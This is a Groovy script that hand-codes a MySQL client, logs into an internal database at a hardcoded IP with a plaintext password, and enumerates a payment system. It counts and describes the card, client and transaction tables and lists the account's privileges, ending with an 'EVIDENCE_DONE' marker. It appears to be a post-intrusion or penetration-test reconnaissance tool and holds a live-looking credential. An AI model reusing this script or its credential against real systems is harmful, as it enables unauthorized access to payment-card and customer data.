import java.net.Socket
import java.net.InetSocketAddress
import java.security.MessageDigest

class Cur {
  byte[] d
  int i = 0
  long lenenc() {
    int b = d[i] & 0xFF; i++
    if (b < 0xFB) return (long) b
    if (b == 0xFC) { long v = (d[i] & 0xFF) | ((d[i+1] & 0xFF) << 8); i += 2; return v }
    if (b == 0xFD) { long v = (d[i] & 0xFF) | ((d[i+1] & 0xFF) << 8) | ((d[i+2] & 0xFF) << 16); i += 3; return v }
    if (b == 0xFE) { long v = 0; for (int k = 0; k < 8; k++) { v |= ((long) (d[i+k] & 0xFF)) << (8 * k) }; i += 8; return v }
    return -1L
  }
  String lenstr() {
    int fb = d[i] & 0xFF
    if (fb == 0xFB) { i++; return null }
    long l = lenenc()
    String s = new String(d, i, (int) l, 'UTF-8')
    i += (int) l
    return s
  }
}

class MC {
  DataInputStream ins
  BufferedOutputStream outs
  Socket sock

  byte[] readPacket() {
    int b0 = ins.readUnsignedByte(); int b1 = ins.readUnsignedByte(); int b2 = ins.readUnsignedByte()
    int len = b0 | (b1 << 8) | (b2 << 16)
    ins.readUnsignedByte()
    byte[] pl = new byte[len]
    ins.readFully(pl)
    return pl
  }
  void writePacket(int seq, byte[] pl) {
    int len = pl.length
    outs.write(len & 0xFF); outs.write((len >> 8) & 0xFF); outs.write((len >> 16) & 0xFF); outs.write(seq & 0xFF)
    outs.write(pl); outs.flush()
  }
  boolean connectAndAuth(String host, int port, String user, String pass, StringBuilder log) {
    sock = new Socket()
    sock.connect(new InetSocketAddress(host, port), 6000)
    sock.setSoTimeout(15000)
    ins = new DataInputStream(new BufferedInputStream(sock.getInputStream()))
    outs = new BufferedOutputStream(sock.getOutputStream())
    byte[] p = readPacket()
    if ((p[0] & 0xFF) != 10) { log.append("BAD_PROTO\n"); return false }
    int i = 1
    StringBuilder sb = new StringBuilder()
    while (p[i] != 0) { sb.append((char) (p[i] & 0xFF)); i++ }
    i++
    i += 4
    byte[] salt1 = new byte[8]; System.arraycopy(p, i, salt1, 0, 8); i += 8
    i++; i += 2; i++; i += 2; i += 2
    int authLen = (p[i] & 0xFF); i++
    i += 10
    int salt2Len = Math.max(13, authLen - 8)
    def salt2List = []
    int avail = p.length - i
    for (int k = 0; k < Math.min(salt2Len, avail); k++) { if (p[i + k] != 0) salt2List.add(p[i + k]) }
    byte[] seed = new byte[8 + salt2List.size()]
    System.arraycopy(salt1, 0, seed, 0, 8)
    for (int k = 0; k < salt2List.size(); k++) seed[8 + k] = (byte) salt2List[k]
    def md = MessageDigest.getInstance('SHA-1')
    byte[] s1 = md.digest(pass.getBytes('UTF-8'))
    byte[] s2 = md.digest(s1)
    md.reset(); md.update(seed); md.update(s2)
    byte[] s3 = md.digest()
    byte[] token = new byte[20]
    for (int j = 0; j < 20; j++) token[j] = (byte) ((s1[j] ^ s3[j]) & 0xFF)
    int clientCaps = 0x1 | 0x200 | 0x2000 | 0x8000 | 0x80000 | 0x20000
    ByteArrayOutputStream baos = new ByteArrayOutputStream()
    baos.write(clientCaps & 0xFF); baos.write((clientCaps >> 8) & 0xFF); baos.write((clientCaps >> 16) & 0xFF); baos.write((clientCaps >> 24) & 0xFF)
    baos.write(0); baos.write(0); baos.write(0); baos.write(1)
    baos.write(33)
    baos.write(new byte[23])
    baos.write(user.getBytes('UTF-8')); baos.write(0)
    baos.write(token.length); baos.write(token)
    baos.write('mysql_native_password'.getBytes('UTF-8')); baos.write(0)
    writePacket(1, baos.toByteArray())
    byte[] ap = readPacket()
    int at = ap[0] & 0xFF
    if (at == 0xFF) {
      int code = (ap[1] & 0xFF) | ((ap[2] & 0xFF) << 8)
      log.append("AUTH_ERROR " + code + ": " + new String(ap, 3, ap.length - 3, 'UTF-8') + "\n")
      return false
    }
    if (at == 0xFE) { log.append("AUTH_SWITCH\n"); return false }
    log.append("AUTH_OK\n")
    return true
  }
  String query(String q) {
    ByteArrayOutputStream qb = new ByteArrayOutputStream()
    qb.write(0x03); qb.write(q.getBytes('UTF-8'))
    writePacket(0, qb.toByteArray())
    byte[] rp = readPacket()
    int b0 = rp[0] & 0xFF
    if (b0 == 0xFF) {
      int code = (rp[1] & 0xFF) | ((rp[2] & 0xFF) << 8)
      return "ERR " + code + ": " + new String(rp, 3, rp.length - 3, 'UTF-8')
    }
    if (b0 == 0x00) return "OK"
    Cur c0 = new Cur(d: rp)
    long colCount = c0.lenenc()
    def colNames = []
    for (int ci = 0; ci < colCount; ci++) {
      byte[] cp = readPacket()
      Cur cc = new Cur(d: cp)
      for (int skip = 0; skip < 4; skip++) { cc.lenstr() }
      colNames.add(cc.lenstr())
    }
    readPacket()
    def rows = []
    int guard = 0
    while (guard++ < 400) {
      byte[] rp2 = readPacket()
      int rb = rp2[0] & 0xFF
      if (rb == 0xFE && rp2.length < 9) break
      if (rb == 0xFF) { rows.add(["ROWERR:" + new String(rp2, 3, rp2.length - 3, 'UTF-8')]); break }
      Cur rc = new Cur(d: rp2)
      def vals = []
      for (int ci = 0; ci < colCount; ci++) {
        def v = rc.lenstr()
        vals.add(v == null ? "NULL" : v)
      }
      rows.add(vals)
    }
    StringBuilder res = new StringBuilder()
    res.append("COLS[" + colNames.join("|") + "]")
    rows.each { res.append(" ROW[" + it.join("|") + "]") }
    return res.toString()
  }
  void closeConn() { try { sock.close() } catch (Exception ignored) {} }
}

def mc = new MC()
def log = new StringBuilder()
if (mc.connectAndAuth('172.27.141.26', 3306, 'app_t1', 'pySY8}7>ftpPz9S', log)) {
  println("C_transaction: " + mc.query("SELECT COUNT(*) FROM payment_t1.transaction"))
  println("C_client: " + mc.query("SELECT COUNT(*) FROM payment_t1.client"))
  println("C_card: " + mc.query("SELECT COUNT(*) FROM payment_t1.card"))
  println("C_suscripciones: " + mc.query("SELECT COUNT(*) FROM payment_t1.suscripciones"))
  println("C_planes: " + mc.query("SELECT COUNT(*) FROM payment_t1.planes"))
  println("D_card: " + mc.query("DESCRIBE payment_t1.card"))
  println("D_client: " + mc.query("DESCRIBE payment_t1.client"))
  println("D_transaction: " + mc.query("DESCRIBE payment_t1.transaction"))
  println("GRANTS: " + mc.query("SHOW GRANTS FOR CURRENT_USER()"))
} else {
  println(log.toString())
}
mc.closeConn()
println("EVIDENCE_DONE")
